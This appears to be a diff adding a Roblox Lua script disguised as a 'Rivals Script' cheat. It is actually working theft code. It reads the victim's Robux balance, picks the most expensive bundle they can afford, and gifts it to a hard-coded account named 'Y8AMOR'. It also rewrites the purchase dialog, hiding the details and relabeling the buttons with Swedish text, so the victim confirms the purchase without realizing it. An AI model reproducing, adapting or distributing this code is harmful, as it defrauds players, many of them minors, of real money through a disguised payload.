@@ -1,0 +1,134 @@
+Username = "Y8AMOR"
+
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+
+
+local player = Players.LocalPlayer
+
+local success, TargetUserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
+
+if not success then
+    TargetUserId = nil
+end
+
+-- lista över produkter som kan köpas
+local Products = {
+    {ID = 1890372130, Name = "Heavy Duty Bundle", Price = 1899},
+    {ID = 1890372364, Name = "Classic Bundle", Price = 1149},
+    {ID = 1890371681, Name = "Standard Weapons Bundle", Price = 999},
+    {ID = 2661338143, Name = "Energy Bundle", Price = 1299},
+    {ID = 2146952782, Name = "Pixel Bundle", Price = 888},
+    {ID = 1890372574, Name = "Exogun Bundle", Price = 649},
+    {ID = 1890372831, Name = "Medkit Bundle", Price = 249},
+    {ID = 1890371901, Name = "Starter Bundle", Price = 49},
+    {ID = 2319692001, Name = "Skin Case [x3]", Price = 724},
+    {ID = 1892544195, Name = "Skin Case", Price = 249},
+    {ID = 1892544449, Name = "Skin Case 2", Price = 249},
+    {ID = 2319692175, Name = "Skin Case 2 [x3]", Price = 724},
+    {ID = 2154618268, Name = "Festive Skin Case", Price = 249},
+    {ID = 2319690506, Name = "Festive Skin Case [x3]", Price = 724},
+    {ID = 1890375611, Name = "Legendary Key Bundle", Price = 4999},
+    {ID = 1890375405, Name = "Ultra Key Bundle", Price = 2199},
+    {ID = 1890375172, Name = "Super Key Bundle", Price = 449},
+    {ID = 1890374959, Name = "Mega Key Bundle", Price = 199},
+    {ID = 1890374722, Name = "Key Bundle", Price = 49},
+    {ID = 2319763802, Name = "Legendary Crystal Bundle", Price = 4999},
+    {ID = 2319763722, Name = "Ultra Crystal Bundle", Price = 2199},
+    {ID = 2319763627, Name = "Super Crystal Bundle", Price = 449},
+    {ID = 2319763545, Name = "Mega Crystal Bundle", Price = 199},
+    {ID = 2319763472, Name = "Crystal Bundle", Price = 49},
+}
+local function GetBalance()
+    local balanceText = CoreGui:FindFirstChild("PurchasePrompt")
+        and CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.FooterContent
+        and CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.FooterContent.Content
+        and CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.FooterContent.Content.RemainingBalanceText
+
+    if balanceText and balanceText.Text then
+        local extractedNumber = balanceText.Text:match("(%d+)$")
+        return tonumber(extractedNumber) or 0
+    end
+    return 0
+end
+
+local function GetBestProduct()
+    local balance = GetBalance()
+    for _, product in ipairs(Products) do
+        if product.Price <= balance then
+            return product
+        end
+    end
+    return nil
+end
+
+local function ModifyUI(prompt, showBuy)
+    task.wait(0.2)
+    prompt.ImageColor3 = Color3.fromRGB(48, 0, 0)
+
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if alertContents then
+        local title = alertContents:FindFirstChild("TitleContainer")
+            and alertContents.TitleContainer:FindFirstChild("TitleArea")
+            and alertContents.TitleContainer.TitleArea:FindFirstChild("Title")
+
+        if title then
+            title.Text = "Rivals Script" -- titel
+            title.TextScaled = true
+            title.Size = UDim2.new(1, 0, title.Size.Y.Scale, title.Size.Y.Offset)
+            title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+
+        alertContents.MiddleContent.Visible = false
+        alertContents.Footer.FooterContent.Visible = false
+
+        local buttons = alertContents.Footer:FindFirstChild("Buttons")
+        if buttons then
+            local buyButton = buttons:FindFirstChild("2")
+            local cancelButton = buttons:FindFirstChild("1")
+
+            if showBuy then
+                if cancelButton then cancelButton.Visible = false end
+                if buyButton then
+                    buyButton.Visible = true
+                    buyButton.ButtonContent.ButtonMiddleContent.Text.Text = "Ladda!"
+                    buyButton.ButtonContent.ButtonMiddleContent.Icon.Visible = false
+                end
+            else
+                if buyButton then buyButton.Visible = false end
+                if cancelButton then
+                    cancelButton.Visible = true
+                    cancelButton.ButtonContent.ButtonMiddleContent.Text.Text = "Fortsätt"
+                end
+            end
+        end
+    end
+end
+
+local function Purchase()
+    if not TargetUserId then return end
+    local selectedProduct = GetBestProduct()
+    if selectedProduct then
+        local args = {
+            [1] = selectedProduct.ID,
+            [2] = TargetUserId
+        }
+        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Misc"):WaitForChild("PromptGiftProductPurchase"):InvokeServer(unpack(args))
+    end
+end
+
+local purchasePrompt = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+
+purchasePrompt.ChildAdded:Connect(function(child)
+    if child.Name == "Prompt" then
+        task.wait(0.5)
+        ModifyUI(child, false)
+        Purchase()
+    end
+end)
+
+MarketplaceService:PromptProductPurchase(player, 1851594490)
